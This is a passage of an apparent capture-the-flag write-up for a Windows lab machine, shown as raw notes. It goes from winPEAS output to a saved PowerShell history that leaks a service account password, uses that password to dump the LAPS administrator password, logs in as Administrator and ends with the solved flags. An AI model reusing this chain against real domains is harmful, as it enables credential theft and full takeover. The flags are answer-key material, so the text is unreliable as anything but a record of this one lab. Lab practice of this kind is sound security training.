ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                                                             
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)
                                                                                                                                                             
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\legacyy\Documents\winPEASx64.exe": legacyy [AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

       /---------------------------------------------------------------------------\                                                                         
       |                             Do you like PEASS?                            |                                                                         
       |---------------------------------------------------------------------------|                                                                         
       |         Become a Patreon    :     https://www.patreon.com/peass           |                                                                         
       |         Follow on Twitter   :     @carlospolopm                           |                                                                         
       |         Respect on HTB      :     SirBroccoli & makikvues                 |                                                                         
       |---------------------------------------------------------------------------|                                                                         
       |                                 Thank you!                                |                                                                         
       \---------------------------------------------------------------------------/
````

````
ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: 1
    LAPS Admin Account Name: 
    LAPS Password Complexity: 4
    LAPS Password Length: 24
    LAPS Expiration Protection Enabled: 1
    
    ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
````

````
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
````

https://github.com/n00py/LAPSDumper
````
python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -l timelapse.htb -d timelapse.htb
DC01$:3.%b59!!,5T8v!fI5o6c9Gya
````

````
# evil-winrm -i 10.10.11.152 -S -u Administrator -p '3.%b59!!,5T8v!fI5o6c9Gya' -S

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
07c6b22c29907283832c4a85d1323976
````

## Root

## Secrets

* FLAG_USER = 8acd93fced1257b5205467e86f96d6ff
* FLAG_ROOT = 07c6b22c29907283832c4a85d1323976
